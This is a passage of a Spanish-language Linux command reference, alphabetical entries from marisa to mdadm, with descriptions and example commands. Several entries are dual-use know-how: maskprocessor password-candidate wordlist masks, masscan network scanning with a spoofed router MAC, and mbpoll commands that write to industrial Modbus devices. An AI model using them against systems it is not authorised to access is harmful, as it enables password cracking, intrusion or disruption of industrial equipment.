$ marisa-build ~/dic/words.txt -o ~/dic/words.marisa (construir del diccionario words.txt un archivo binario optimizado con todas las palabras)
$ marisa-dump words.marisa (como "cat words.marisa" volcar el diccionario en pantalla para ver el contenido)
$ marisa-predictive-search words.marisa (entra en el prompt de marisa y espera la entrada del prefijo a buscar)
$ marisa-predictive-search words.marisa <<< palabra (lo mismo pero sin entrar en el prompt interactivo para buscar "palabra")
$ marisa-lookup words.marisa (entra en el prompt de marisa y muestra el número de entrada en el archivo de la palabra que se entre)
$ marisa-lookup dic.marisa <<< palabra (lo mismo sin entrar en el promt interactivo)
$ marisa-benchmark words.marisa (toma la misma información que marisa-build y mide el rendimiento de libmarisa para el conjunto de claves especificado)
$ marisa-common-prefix-search (busca claves entre los posibles prefijos de las cadena que se entra y luego imprime las primeras m claves, donde m es uno de los parámetros)


markdent
Herramienta para generar HTML de archivos Markdown y sus variantes.
$ markdent-html --language es_ES --file README.md > readme.html (convertir Markdown a HTML)


markdown
Lenguaje orientado a la escritura de documentos de manera que sean fáciles de escribir y leer directamente en texto plano convirtiéndolos en documentos XHTML bien formados. La aplicación retext permite eleborar textos en markdown y visualizarlos en tiempo real.
Sintaxis elemental [las referencias son respecto de html]:
Notas: Cada signo afecta hasta el primer salto de linea. Un bloque HTML ha de estar precedido por una linea en blanco y con una sangría de 4 espacios y en su interior no actúa la sintaxis markdown. Para escapar un carácter se precede barra [\\] . Los párrafos se delimitan con lineas en blanco.
	# (equivalente a H1. Mismo resultado subrayando el texto con el signo = en la linea inmediata inferior)
	## (equivalente a H2. Mismo resultado que subrayando el texto con el signo - en la linea inmediata inferior)
	> (muestra el texto que sigue como una cita)
	* (Mostrará como una lista no ordenada)
	1. (Mostrará como una lista ordenada)
	**texto** (texto entre dos pares de asteriscos: en negrita)
	*texto* (texto entre asteriscos: en cursiva)
	***texto*** (Texto entre dos trios de asteriscos: negrita y cursiva)
	2 espacios al final de una linea fuera salto de linea
	<URL> (Modo de colocar un enlace. Igual para un email)
	--- (3 guiones muestran una linea)
	[nombre del enlace](http://url "nombre que aparece al colocar el cursor") (Enlace a una URL. El entrecomillado es opcional)
	Ejemplo: Puedes buscar en \[google](http://google.es "google") o en \[yahoo](http://es.yahoo.com "yahoo")
	![imagen](http://url "nombre que aparece al colocar el cursor")
	Ejemplo: !\[Herramientas](http://www.linux-mag.com/s/i/topics/toolbox.jpg "Caja de herramientas")
	<img class="[clases asignadas]" src="/ruta/a/la/imagen" title="[ancho] [alto] [el title [alt de la imagen]]" > (Colocar una imagen)


markdownlint
verifica la consistencia sintáctica de un archivo Markdown individual o de un directorio de archivos Markdown. En su informe a la CLI, la implementación basada en Ruby indica las líneas con problemas identificados y cómo solucionarlos.
$ mdl -l (listado de las reglas)
$ mdl -r MD001,MD004,MD013,MD032 -l (Enumerar los objetivos de las reglas MD001, MD004, MD013 y MD032)
$ mdl -r MD001,MD004 README.md (solo aplicar las reglas especificadas)
$ mdl README.md (aplicar todas las reglas disponibles
$ mdl -r ~MD001,~MD004,~MD032 README.md (examinar el archivo según todas las reglas disponibles excepto MD001, MD004 y MD032)


maskprocessor
Generador rápido de listas de palabras que permite crear, de manera flexible, todas las combinaciones posibles según una máscara definida por el usuario, personalizando el espacio de claves con alfabetos distintos en cada posición del patrón. Los ejecutables son mp32 y mp64.
Generador rápido de listas de palabras. Enumera todas las combinaciones de un espacio de claves definido por el usuario y genera los resultados. Al admitir diferentes alfabetos (que también pueden combinarse) en diferentes posiciones de la plantilla de generación ('máscara'), este enfoque permite una generación de candidatos más precisa que la enumeración ingenua de palabras por fuerza bruta.
Cada uno de los caracteres siguientes pñuede sustituir un caracter del patrón:
        ?l --> minúsculas (abcdefghijklmnopqrstuvwxyz)
        ?u --> mayúsculas (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
        ?d --> dígitos (0123456789)
        ?s --> símbolos
        ?a --> todos los anteriores
        ?1, ?2, ?3, ?4 --> conjuntos personalizados definidos por el usuario con los parámetros -1, -2, -3 y -4
$ mp64 perr?d (sustituira el último caracter de la palabra perro [la "o"] por un dígito: perr1, perr2, perr3...)
$ mp64 p?srr?u (el segundo caracter por un simbolo y el último por una mayúscula)
$ mp64 -i 3:5 ?a?l?d?s?a (genera palabras empezando por 3 caracteres e incrementar hasta 5 caracteres con los equivalentes especificados)
$ mp64 -o salida.txt -1 AEIOU ?1?d?d (generar conjuntos personalizados, en la primera posición [AEIOU] y dígitos en las siguientes y guardar el resultado en salida.txt)
$ mp64 --combinations -1 AEIOU ?1?d?d (solo muestra el total de combinaciones)
$ mp64 -1 AeItr -2 *+40w ?1?d?2 (generar palabras de 3 dígitos, el primero y el tercero con los caracteres especificados y el segundo un dígito)


masscan
Escaner de puertos. Produce resultados similares a "Nmap". Tiene permanentemente activada las siguientes opciones: "-sS" realiza un escaneo de tipo TCP SYN, "-Pn" trata todos los hosts como si estuviesen en funcionamiento, "-n" no hace una resolución DNS, "--randomize-hosts" aplica aleatoriedad al orden de los host a escanear, "-v" genera verbosidad y la opción "--send-eth" utiliza para el envío paquetes ethernet en bruto.
# masscan --regress (autotest integrado)
# masscan 192.168.1.0/24 -p80,443 (escanea los puertos 80 y 443 en toda la red))
# masscan 192.168.1.0/24 -p 22-150 (escanea el rango de puertos del 22 al 150)
# masscan 192.168.1.0/16 -p80 --rate 1000 --router-mac 66-55-44-33-22-11 (escaneando un puerto de una red con una MAC falsa del router para no salir a internet y enviardo 1000 paquetes por segundo)
# masscan 192.168.1.0/16 ‐‐top-ports 100 > escaner.txt (escanear los 100 puertos más comunes según nmap y guardarlo en el archivo escaner.txt)
# masscan 192.168.1.5 -p 0-65535 --rate 1000 (escanear todos los puertos de una IP, limitando la velocidad para no saturar la red)
# masscan -p80 --banners 0.0.0.0/24 (obtener los baners de todas las ips de una red con el puerto abierto 80)
# masscan 192.168.1.5 -p22,80 --open-only --output-format grepable --output-filename file.txt --interface enp1s0 (en un formato más claro y guardando el resultado en file.txt)
Para una prueba rápida, levantar un servidor temporal en la propia máquina:
$ python3 -m http.server 8080
   Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
Escanear con:
# masscan 127.0.0.1 -p8080 --open-only
   Discovered open port 8080/tcp on 127.0.0.1


mat2
[Metadata Anonymisation Toolkit 2]. Elimina metadatos de una amplia variedad de formatos de archivo [JPEG, PNG, GIF, TIFF, PDF, DOCX, ODT, PPTX, XLSX, MP3, FLAC, WAV, etc] generando un archivo con la palabra "cleaned" entre el nombre y su extensión; por ejemplo, "filename.cleaned.png" para un archivo llamado "filename.png". Los metadatos son información oculta que muchos archivos almacenan, como: Nombre del autor, fecha de creación, ubicación GPS, dispositivo utilizado, historial de ediciones, software con el que se creó el archivo. etc sin que el usuario lo note.
$ mat2 -l (ver todos los formatos suportados)
$ mat2 -s foto.png (ver todos los metadatos del archivo especificado)
$ mat2 foto.jpg (genera un archivo foto.cleaned.jpg sin metadatos y sin eliminar el original)
$ mat2 informe.pdf (lo mismo con un documento .pdf)
$ mat2 foto.jpg documento.docx audio.mp3 archivo.pdf (limpiar múltiples archivos)
$ mat2 --inplace foto.jpg (elimina el original y deja con el mismo nombre, foto.jpg, el limpio de metadatos)


match_parens
Encontrar en textos paréntesis, llaves, corchetes, comillas, etc desparejados.
$ match_parens --test texto.txt


mate-screensaver-command
Mismas opciones que gnome-screensaver-command [ver].


matio-tools
Biblioteca en C para leer y escribir archivos MAT de MATLAB. Incluye la herramienta matdump. Los archivos MAT de MATLAB son archivos binarios de datos utilizados por MATLAB para almacenar variables, matrices, vectores y datos estructurados que se han generado o manipulado durante una sesión de trabajo. Estos archivos permiten guardar el estado de las variables y recuperarlo posteriormente, funcionando como un contenedor eficiente para grandes volúmenes de datos científicos y de ingeniería.
$ matdump archivo.mat (imprime una lista legible de todas las variables almacenadas en archivo.mat, mostrando sus nombres, tamaños y tipos)


matomo
Conjunto de archivos PHP y una base de datos MySQL que se ejecuta en el servidor, con Apache/Nginx, PHP y MySQL/MariaDB y se gestiona a través de la interfaz web. Es una alternativa de código abierto a Google Analytics. Matomo genera un código de seguimiento JavaScript. Este código se inserta en las páginas web que se desea analizar. Cuando un visitante carga la página, el código se ejecuta y envía los datos de la visita: páginas vistas, clics, etc. al servidor Matomo.
La instalación en el servidor implica descomprimirlo en el servidor web normalmente en el directorio /var/www/html/matomo, y luego seguir un asistente de instalación a través del navegador accediendo a la URL http://tudominio.com/matomo.
Dar de alta un nuevo sitio para rastrear y se obtiene el código de seguimiento similar a este:
        <script>
          var _paq = window._paq = window._paq || [];
          _paq.push(['trackPageView']);
          _paq.push(['enableLinkTracking']);
          (function() {
            var u="//tudominio.com/matomo/";
            _paq.push(['setTrackerUrl', u+'matomo.php']);
            _paq.push(['setSiteId', 1]);
            var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
            g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
          })();
        </script>
Copiar y pegar el código anterior dentro de la etiqueta <head> o <body> de cada página del sitio web que se quiera analizar. Cada vez que un usuario visite una página con este código, se registrará la visita en la instancia de Matomo y en el panel de control de Matomo en el navegador se podrán ver los informes de tráfico, comportamiento de los usuarios, conversiones, y más.


mawk
Intérprete del lenguaje de programación AWK [ver] más pequeño y mucho más rápido que gawk.


maybe
[python-ptrace]. Ejecuta un script validando sus funciones y simulando su ejecución cuando en realidad no se està ejecutando.
$ maybe script.sh


mb2md
[MBox to MailDir]. Convierte buzones de correo en formato Mbox a formato Maildir. Mbox es un formato de buzón de correo donde todos los mensajes de un buzón se almacenan en un solo archivo. Cada mensaje está separado por una línea que comienza con "From ". Es simple pero puede ser problemático para buzones grandes o en sistemas con alta concurrencia, ya que el archivo puede corromperse si varios procesos intentan acceder a él simultáneamente. Maildir es un formato más robusto donde cada mensaje de correo se almacena como un archivo individual en un directorio estructurado haciendolo más eficiente y seguro para sistemas de correo modernos.
$ mb2md -s inbox.mbox -d /home/usuario/Maildir (especifica un archivo Mbox individual y el directorio de destino para el Maildir con subdirectorios new, cur y tmp)
$ mb2md -f -d /home/usuario/Maildir (todos los archivos Mbox en el directorio actual se convierten, y los mensajes se almacenan en /home/usuario/Maildir. Si existen se fuerza la sobreescritura)
$ mb2md -R -d /home/usuario/Maildir (busca recursivamente archivos Mbox y los convierte, manteniendo la estructura de directorios en /home/usuario/Maildir)
$ mb2md -s inbox.mbox -m -d /home/usuario/Maildir (solo los mensajes no leídos de inbox.mbox se convierten al formato Maildir)


mblaze
Conjunto de utilidades para gestionar el correo almacenado en las carpetas Maildir. No envia ni recibe correo. Incluye las utilidades maddr (extraer direcciones del correo), magrep (buscar correos que coincidan con un patrón), mcom (redactar y enviar correo), mdeliver (entregar mensajes o importar buzones), mdirs (buscar carpetas de Maildir), mexport (exportar carpetas de Maildir como buzones), mflag (cambiar las marcas del correo), mflow (redistribuir correos de texto plano con formato de flujo), mfwd (reenviar correo), mgenmid (generar identificadores de mensajes), mhdr (extraer encabezados de correo), minc (incorporar correo nuevo), mless (leer correo fácilmente en less), mlist (listar y filtrar mensajes de correo), mmime (crear mensajes MIME), mmkdir (crear un nuevo Maildir), mpick (filtro de correo avanzado), mrep (responder al correo), mscan (generar resúmenes de una línea del correo), msed (manipular los encabezados del correo), mseq (manipular las secuencias del correo), mshow (representar el correo y extraer los adjuntos), msort (ordenar el correo) y mthread (organizar el correo en discusiones).


mbmon
Monitorea las temperaturas, voltajes y rpm de ventiladores de refrigeración de la cpu.
# mbmon -c2 (realizar dos monitoreos y salir)
# mbmon -t -u -n (informando de la hora, el sistema y el hostname)


mbpoll
Herramienta que permite leer y escribir datos en dispositivos esclavos Modbus ya sea a través de los protocolos RTU [serial] o TCP [red]. Modbus es un protocolo de comunicación ampliamente utilizado en automatización industrial para interactuar con dispositivos, como PLCs, sensores o actuadores.
$ mbpoll -m rtu -a 1 -t 1 -r 100 -c 5 /dev/ttyUSB0 (protocolo RTU, dirección del esclavo ID 1 [1-247], -t 1 entradas discretas, -r 100 dirección inicial del registro, leer 5 entradas consecutivas y puerto serial conectado al dispositivo)
Nota.- El tipo de datos a leer/escribir [-t]: 0 para coils, 1 para entradas discretas, 3 para registros de entrada y 4 para registros de retención.
$ mbpoll -m tcp -a 2 -t 0 -r 50 -c 3 192.168.1.100 (usa protocolo TCP, esclavo con ID 2, tipo 0 [coils], dirección inicial 50, leer 3 coils y dirección IP del esclavo)
$ mbpoll -m tcp -a 2 -t 0 -r 50 192.168.1.100 1 (encender el coil en la dirección 50 [ON, binario 1]. El puerto TCP por defecto es el 502)
$ mbpoll -m rtu -a 1 -t 3 -r 300 -c 2 /dev/ttyUSB0 (protocolo RTU, esclavo ID 1, tipo 3 [registros de entrada], dirección inicial 300, leer 2 registros y puerto serie del dispositivo=
$ mbpoll -m tcp -a 1 -t 4 -r 400 -c 4 192.168.1.100 (protocolo TCP, esclavo ID 1, tipo 4 [registros de retención], dirección de entrada 400, leer 4 registros y dirección IP del esclavo)
$ mbpoll -m tcp -a 1 -t 4 -r 400 -c 2 -f float 192.168.1.100 (leer registros como flotantes con la opción -f float)
$ mbpoll -m tcp -a 1 -t 4 -r 200 192.168.1.100 500 (escribir el valor 500 en el registro 200)
$ mbpoll -m rtu -a 1 -b 19200 -d 8 -p none -s 1 -t 4 -r 400 -c 2 /dev/ttyUSB0 (protocolo RTU, esclavo ID 1, velocidad 19200 baudios, 8 bits de datos, sin paridad, 1 bit de parada, tipo 4, dirección inicial 400, leer 2 registros y puerto serie)


mbr
Se utiliza para arrancar sistemas operativos desde el disco duro. Se ejecuta primero y luego transfiere el control al cargador del sistema operativo, que a su vez lo transfiere al núcleo. El paquete es un pequeño programa de arranque alternativo que se puede instalar si se quiere sobrescribir el MBR [Master Boot Record] con un código “genérico” que luego pase el control a un gestor de arranque o a la partición activa. Es un binario de usuario que puede grabar un código de arranque muy simple en los primeros 512 bytes de un disco. Lo que realmente arranca en el sistema no depende del paquete mbr, sino de lo que el gestor de arranque haya escrito en el sector 0 del disco normalmento grub-pc. El paquete mbr sirve para grabar un MBR genérico que busque la partición activa y le ceda el control, como hacían los PCs antiguos con DOS o Windows, para hacer pruebas con arranques muy básicos, sin depender de GRUB o reparar un disco que perdió su código de arranque pero aún conserva particiones arrancables.
# install-mbr /dev/sda (escribiría un MBR genérico en el primer sector del disco /dev/sda)


mbsync
ver isync


mbt
[Memory Based Tagger]. Herramienta académica de procesamiento del lenguaje natural desarrollada por universidades europeas [Radboud, Tilburg, Antwerp] y generador de etiquetas morfosintácticas [POS tagging], chunking, lematización, etc.  Incluye la herramienta mbtg [archivos de entrenamiento]. Ver mbtserver.
$ mbt -f configfile.cfg < input.txt > output.tagged (lee un archivo de configuración y etiqueta un texto de entrada)
$ mbtg -f configfile.cfg -n modelname (entrena un modelo de etiquetado a partir de un corpus anotado)
1.-
Simular un flujo completo para entrenar un modelo pequeño y usarlo para etiquetar.
$ mkdir ~/mbt-test && cd ~/mbt-test (crear un directorio de trabajo y entrar en él)
Crear un corpus de entrenamiento con frases ya etiquetadas: una palabra + etiqueta por línea y frases separadas por líneas vacías (por cuestiones de configuración del texto hemos puesto ### que han de borrarse):
$ nano train.data
        El      DET
        perro   NOUN
        marrón  ADJ
        come    VERB
        rápido  ADV
        .       PUNCT
        ###
        La      DET
        gata    NOUN
        blanca  ADJ
        duerme  VERB
        .       PUNCT
Crear un archivo de configuración que define cómo se construyen los contextos para el aprendizaje.
$ nano config.cfg
        0=w[-1]
        1=w[0]
        2=w[1]
        3=POS[-1]
        LABEL=POS
w[-1] es la palabra anterrior,  w[0] es la palabra actual, w[1] la siguiente, etc. POS[-1] es la etiqueta anterior, LABEL=POS qué vamos a predecir.
Entrenar el modelo
$ mbtg -f config.cfg -n spanish_model -i train.data
crear un texto a etiquetar:
$ nano test.txt
        Un gato negro salta .
        La niña canta feliz .
Etiquetarlo:
$ mbt -f config.cfg -s spanish_model -i test.txt -o output.tagged
Resultado en output.tagged:
$ cat output.tagged
        Un      DET
        gato    NOUN
        negro   ADJ
        salta   VERB
        .       PUNCT
        ###
        La      DET
        niña    NOUN
        canta   VERB
        feliz   ADJ
        .       PUNCT
Nota.- El ejemplo mencionado puede fallar o inventar, pero en corpus grandes funciona muy bien.


mbtserver
Servidor TCP/HTTP que permite etiquetar texto remotamente. Ver mbt.
$ mbtserver -f config.cfg -s spanish_model -p 8080 & (iniciar el servidor en segundo plano)
$ echo "El sol brilla hoy ." | nc localhost 8080 (enviar texto vía netcat o curl)


mbuffer
La herramienta se utiliza para almacenar en búfer flujos de datos y mostrar la tasa de entrada/salida [E/S], como el caudal de transferencia y el resumen de la actividad. Es especialmente útil en contextos donde la fuente y el destino de un flujo de datos tienen velocidades distintas, como al hacer copias de seguridad a cintas, transferir mediante red o cuando se necesita suavizar picos de actividad para evitar cuellos de botella.
$ cat archivo.img | mbuffer > destino.img (coloca a mbuffer entre la producción y el consumo de datos, permitiendo almacenar en búfer temporal y mantener la transferencia constante)
$ mbuffer -s 128k -m 1G < archivo.img | nc destino 9090 (enviar datos con un tamaño de bloques de 128k, el tamaño del buffer de 1G por red usando mbuffer en la máquina de origen)
$ nc -l -p 9090 | mbuffer -s 128k -m 1G > archivo.recibido (y en la máquina de destino)


mbw
Determina el ancho de banda de la memoria de "copia" disponible para los programas del espacio de usuario.
$ mbw 1000 (tamaño de la matriz para las pruebas de 1000 [ARRAY_SIZE])
$ mbw -a -n 2 1000 (dos números por prueba con 1 G de memoria y no mostrar promedio [-a])
$ mbw -t 1 -n 3 1000 (3 ejecuciones por prueba y solo en la DUMB ["-t 0" para la MEMCY y "-t 2" para la MCBLOCK)
mbw proporcionará tres métricas principales en los resultados:
     MEMCPY: Mide el ancho de banda de la memoria al copiar datos utilizando la función memcpy estándar.
     DUMB: Mide el ancho de banda de la memoria mediante un bucle simple para copiar datos.
     MCBLOCK: Mide el ancho de banda de la memoria utilizando funciones de memoria con tamaños de bloque específicos.
Más o menos los resultados pueden ser:
    ...
    Method: MEMCPY	Elapsed: 0.20857	MiB: 1000.00000	Copy: 4794.588 MiB/s
    ...
    Method: DUMB	Elapsed: 0.14374	MiB: 1000.00000	Copy: 6956.909 MiB/s
    ...
    Method: MCBLOCK	Elapsed: 0.09181	MiB: 1000.00000	Copy: 10892.356 MiB/s


mc
Gestor de archivos. La pantalla de Midnight Commander está divida en cuatro partes. La mayor parte de la pantalla está ocupada por los dos paneles de directorio. Por defecto, la segunda línea inferior de la pantalla es la línea de órdenes del sistema y la línea inferior muestra las etiquetas de las teclas de función. La línea superior es la barra de menú que si no está visible puede verse pulsando F9. MC pone a la vista dos directorios al mismo tiempo. Uno de los paneles es el panel actual. Algunas operaciones con archivos como Renombrar y Copiar utilizan por defecto el directorio del panel no seleccionado como destino, pero siempre solicitan una confirmación previa y podemos cambiarlo. Podemos ejecutar comandos del sistema desde MC simplemente escribiéndolos. Todo lo que escribamos aparecerá en la línea de órdenes del sistema y cuando pulsemos Intro, Midnight Commander ejecutará estos comandos. Si tenemos el ratón activado [ver gpm] para seleccionar texto mantener pulsada la tecla Mayúsculas mientras se selecciona.
$ mc -S gotar.ini /media/servidor /home/usuario (Especificando un skin [Listado en /usr/share/mc/skins] y directorio de cada panel)
Colocando la linea como alias en .bashrc arancará siempre con esta configuración inicial:
$ nano .bashrc
alias mc='mc -S gotar.ini /media/servidor /home/usuario'
Algunas teclas de control:
	F1 (Despliega el Menú de ayuda)
	F3 (Activa el Visor de archivos interno)
	F4 (Ejecuta el Editor interno)
	F5 (Copiar archivos)
	F6 (Mover archivos)
	F7 (Crear carpeta)
	F8 (Borrar archivos)
	F9 (Activa el menú principal desplegable)
	F10 (Salir de mc)
	Tab (Moverse entre los paneles)
	Insert (Marcar para operaciones con múltiples archivos)
	Supr (Eliminar archivo)
	Flechas de desplazamiento (Permiten moverse por menús y submenús)
	Alt-Enter (copiar el nombre de un archivo en la línea de comandos [cp o mv])
	Alt-Tab (misma función que la tecla TAB en el shell [completar comando o ruta tras haber escrito sus primeras letras]
	Alt-p (Retrocede por el historico de comandos)
	Alt-n (Avanza por el historico de comandos)
	Alt-h (Abre una ventana con el historico de comandos)
1.-
Mas personalizaciones de los colores:
Colores posibles: white, gray, blue, green, yellow, magenta, cyan, red, brown, birghtgreen, brightblue, brightmagenta, brightcyan, brightred, lightgray, default
Se puede incidir en los siguientes aspectos de los grupos:
	Base colors: normal, selected, marked, markselect, errors, input, reverse, gauge
	Menu colors: menu, menusel, menuhot, menuhotsel
	Dialog colors: dnormal, dfocus, dhotnormal, dhotfocus
	Help colors: helpnormal, helpitalic, helpbold, helplink, helpslink
	Viewer color: viewunderline
	Special highlighting colors: executable, directory, link, stalelink, device, special, core
	Editor colors: editnormal, editbold, editmarked
Nota.- No tienen que definirse obligatoriamente todos los subgrupos
Para pruebas:
	$ mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
Para dejar la seleccion permanente crear en el directorio (Si no existe se crea):
$ nano .moc/ini
Y pegar:
	[colors]
normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default
Si lo queremos como alias:
$ nano .bashrc
Y pegamos:
	alias mc="mc --colors normal=green,default:selected=brightmagenta,gray:marked=yellow,default:markselect=yellow,gray:directory=blue,default:executable=brightgreen,default:link=cyan,default:device=brightmagenta,default:special=lightgray,default:errors=red,default:reverse=green,default:gauge=green,default:input=white,gray:dnormal=green,gray:dfocus=brightgreen,gray:dhotnormal=cyan,gray:dhotfocus=brightcyan,gray:menu=green,default:menuhot=cyan,default:menusel=green,gray:menuhotsel=cyan,default:helpnormal=cyan,default:editnormal=green,default:editbold=blue,default:editmarked=gray,blue:stalelink=red,default"
2.-
Para configurar las aplicaciones que se usarán por defecto:
$ cp /etc/mc/mc.ext .mc/bindings
$ nano .moc/bindings
Y modificar las que procedan. Ejemplo:
	# Para abrir los txt com vi
		shell/.txt
        	Open=%var{EDITOR:vi} %f
	# Que los videos los abra vlc
		include/video
        	Open=(vlc %f >/dev/null 2>&1 &)


mcabber
Es un cliente de chat para la red Jabber [XMPP] en modo texto que incluye funciones como compatibilidad con SASL, registro de historial, finalización de comandos, módulos dinámicos y activadores de acciones externas
$ mcabber -s jabber.org -u usuarioejemplo (conectarse al servidor XMPP con el nombre de usuario, mcabber pedirá contraseña que puede guardarse en un archivo de configuración para evitar escribirla cada vez)
Una vez dentro de la interfaz de mcabber, se puede usar una serie de comandos que se inician con una barra inclinada [/]. Algunos de los más útiles:
        /help --> Muestra una lista de todos los comandos disponibles.
        /add amigo@servidor.com --> Agrega un contacto a tu lista de amigos.
        /join sala_linux@servidor.com --> Te une a una sala de chat, también conocida como MUC, Multi-User Chat.
        /msg amigo@servidor.com Hola, ¿cómo estás? --> Envía un mensaje directo a un usuario sin cambiar de pantalla.
        /status away Estoy comiendo --> Cambia tu estado de presencia [away, online, dnd - Do Not Disturb].
        /quit --> Cierra la sesión y sale de mcabber.
Para navegar entre conversaciones abiertas usando Ctrl + n [siguiente] y Ctrl + p [anterior] o Alt + número para ir directamente a una conversación específica.
Ejemplo de un archivo de configuración básico:
$ nano ~/.mcabber/mcabberrc
        set username = usuarioejemplo
        set server = jabber.org
        set password = tu_contraseña_segura
        set save_history = 1
        set auto_join = sala_linux@servidor.com
Este archivo configura el cliente para que se conecte automáticamente a jabber.org con el usuario usuarioejemplo, guarde el historial de conversaciones y se una a la sala de chat sala_linux@servidor.com al iniciar.


mceliece
Es un sistema criptográfico de clave pública basado en códigos de corrección de errores. Es resistente a ataques con computación cuántica, por lo que se considera un candidato para la criptografía post-cuántica. Las herramientas se agrupan de la siguiente manera:
        mceliece {6960119,6688128,8192128,460896,348864} -keypair
        mceliece {6960119,6688128,8192128,460896,348864} f-kepair
        mceliece {6960119,6688128,8192128,460896,348864} -enc
        mceliece {6960119,6688128,8192128,460896,348864} -dec
Las claves [mceliece...-keypair y mceliece...f-keypair] se generan aleatoriamente la publica y la secreta. La clave pública la archiva en el descriptor 5 y la clave secreta en el descriptor 9. El comando mceliece...f-kepair es internamente más complicado que el comando mceliece...-keypair, pero proporciona una generación de claves más rápida. Los comandos son interoperables.
La encapsulación se ejecuta cpn el comando mceliece...-enc. Este comando lee la clave pública desde el descriptor de archivo 4. Genera aleatoriamente un texto cifrado y la clave de sesión correspondiente. Escribe el texto cifrado en stdout, y luego escribe la clave de sesión para archivar el descriptor 7.
La decapsulación se ejecuta con el comando mceliece...-dec. Este comando lee la clave secreta desde el descriptor de archivo 8, y luego lee un texto de cifrado de Stdin. Calcula la clave de sesión correspondiente, que escribe en el descriptor de archivos 7.
Unos ejemplos con las más usuales:
$ mceliece-fulltest (ejecuta pruebas completas del sistema)
$ mceliece-speed (pruebas de rendimiento. Mide el rendimiento de las operaciones criptográficas: velocidad de cifrado, descifrado, generación de claves)
$ mceliece-speed 1000 (especificando número de iteraciones)
$ mceliece-test (ejecuta pruebas unitarias para verificar que los componentes básicos funcionan correctamente)
El proceso criptográfico es el siguiente:
$ mceliece348864-keypair 5>publickey 9>secretkey (generar clave)
$ ls
publickey  secretkey
$ mceliece348864-enc >ciphertext 7>sessionkey 4<publickey (encapsular)
$ mceliece348864-dec 7>sessionkey <ciphertext 8<secretkey (desencamsular)
$ ls
ciphertext  publickey  secretkey  sessionkey
Notas.- Los números en los nombres [348864, 460896, 6960119, 8192128] se refieren a los parámetros de seguridad, 3488 bits de seguridad para la clave o 4608, etc, y cuando se genera la clave el parámetro numérico 6960119, para encapsular y desencapslar es preferible usar el .enc y .dec que coincida con el número de su parámetro de seguridad [6960119] para evitar errores [fatal: read publickey failed: end of file]. Las claves públicas de mceliece son enormes, de cientos de kilobytes o más. Por eso aunque es seguro post-cuántico, no es práctico para todos los usos.


mcfly
Reemplaza la búsqueda predeterminada en el historial. Una vez instalado, abriendo un terminal y tecleando Ctrl-r abre un motor de búsqueda inteligente que tiene en cuenta el directorio de trabajo y el contexto de los comandos ejecutados recientemente. Las sugerencias de McFly se priorizan en tiempo real. Añadir a archivo:
$ nano ~/.bashrc
La linea:
eval "$(mcfly init bash)"


mcookie
Genera números hexadecimales de 128 bits aleatorios.
$ mcookie


mcp
[mmv)]. Permite hacer copias de varios ficheros.
$ mcp ";*.png" "#1#2.png.bak" (Realizará un .png.bak de todos los .png que encuentre en el presente directorio y sus subdirectorios)


mcrypt
Cifrar achivos
$ mcrypt archivo   (cifrar)
$ mcrypt -u archivo  (elimina el archivo inicial despues del cifrado)
$ mdecrypt archivo.nc  (descifrar)
$ mcrypt --d archivo.nc   (descifrar)
$ mcrypt --list   (ver lista de algoritmos usables)
$ mcrypt -a rijndael-256 ecb archivo  (cifrar especificando un algoritmo)
$ mcrypt -p archivo    (usando compresión bzip2 antes de la encriptación)
$ mcrypt -b archivo   (No mantener información del algoritmo usado en el cifrado)


mcstrans
Demonio MCS [Multiple Category System] que traduce las etiquetas y categorias MCS/MLS de SELinux [s0, s15, c0, c1023] a un formato legible [Payroll,Finance] configurados en /etc/selinux/{SELINUXTYPE}/setrans.conf.
# systemctl start mcstrans (habilitar el servicio)
# mcstrans -f (Ejecutar en primer plano. No como demonio)
Nota.- Rara vez se usa manualmente, pero es clave para leer y dar sentido a la información MCS/MLS en sistemas con SELinux.
Ejemplo de funcionamiento
# nano /etc/selinux/targeted/setrans.conf
        s0:c0  = Marketing
        s0:c1  = Finance
        s0:c2  = Payroll
        s0:c3  = Personnel
Si una herramienta muestra un contexto tipo "system_u:object_r:default_t:s0:c0,c2", mcstransd puede traducirlo automáticamente a "system_u:object_r:default_t:Marketing,Payroll"


md2html
Utilidad basada en la biblioteca MD4C que convierte archivos Markdown a HTML.
$ md2html -f -o salida.html file.md (Generar documento HTML completo, incluido el encabezado y guardarlo en salida.html)


md2term
Ver presentaciones de markdown para textos cortos de menos de 30 líneas y, al mismo tiempo, poder visualizarse con otras presentaciones en sitios web como GitHub, GitLab, etc. El script también se puede utilizar satisfactoriamente para ver otros textos de markdown, siempre que se respeten sus limitaciones.
$ md2term -k 1 -p -f file.md (manteniendo todas las marcas [-k 0 sin mantenerlas, -k2 solo para el titulo], aplicando "less" del archivo epecificado)


md5sum
Escribe o comprueba sumas de verificación md5.
$ md5sum archivo
$ md5sum -  (Entra en el prompt. Teclear la palabra o frase y pulsar dos veces Ctrl+d)
$ echo -n palabra | md5sum | awk '{print $1}' (md5sum de una palabra)
$ md5sum * > MD5SUMS (crear un directorio con los md5sum de todos los archivos)


mdadm
Gestión de raids.
# mdadm --create --verbose /dev/md0 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1
        --create (Para crear el raid)
        --verbose (No pregunte)
        /dev/md0 (Dispositivo dónde vamos a crear el raid)
        --level=1 (Nivel 1 del RAID [dos discos uno espejo del otro)
        --raid-devices=2 (Número de dispositivos)
        /dev/sdb1 /dev/sdc1 (los dispositivos que vamos a usar)


mdbook
